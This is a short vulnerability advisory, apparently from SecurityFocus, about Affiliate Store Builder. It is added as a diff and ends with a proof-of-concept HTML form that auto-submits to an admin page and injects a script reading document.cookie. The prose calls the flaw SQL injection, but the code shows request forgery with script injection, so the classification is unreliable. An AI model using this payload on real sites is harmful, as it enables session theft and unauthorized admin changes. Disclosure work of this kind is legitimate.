@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/40058/info
+
+Affiliate Store Builder is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+<form action='http://www.example.com/admin/edit_cms.php?page=1' name="frm" method='post' > <input name="title" type="hidden" value="Home"/> <input name="type" type="hidden" value="header"/> <input name="desc_meta" type="hidden" value="page+desc" /> <input name="desc_key" type="hidden" value='"><script>alert(document.cookie)</script>' /> <input name="cms_id" type="hidden" value="1" /> <input name="edit_page" type="hidden" value="Edit+Page" /> </form> <script> document.frm.submit(); </script> 
